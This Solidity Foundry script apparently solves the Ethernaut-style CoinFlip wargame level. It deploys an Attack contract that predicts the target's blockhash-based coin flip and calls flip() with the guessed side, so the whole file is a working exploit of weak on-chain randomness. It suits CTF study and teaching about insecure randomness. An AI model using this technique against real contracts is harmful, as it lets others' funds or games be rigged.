// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/CoinFlip.sol";

contract CoinFlipScript is Script {

    function setUp() public {
    }

    function run() public {
        vm.startBroadcast();

        new Attack();

        vm.stopBroadcast();
    }
}

contract Attack {
    constructor() {
        CoinFlip target = CoinFlip(0x90aee37Ae04b2D5aF076cEB08b4357992391bc1A);

        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip_ = blockValue / FACTOR;
        bool side = coinFlip_ == 1 ? true : false;
        
        target.flip(side);
    }
}